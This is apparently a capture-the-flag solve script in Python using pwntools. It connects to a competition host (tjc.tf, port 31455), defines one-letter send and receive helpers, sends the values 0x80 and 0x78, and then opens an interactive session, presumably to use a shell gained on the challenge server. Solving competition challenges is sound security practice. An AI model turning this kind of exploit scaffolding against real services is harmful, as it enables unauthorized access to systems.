from pwn import *
from icecream import ic


io = remote("tjc.tf", 31455)
context.log_level = "debug"

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

sl(str(0x80))
sl(str(0x78))

io.interactive()
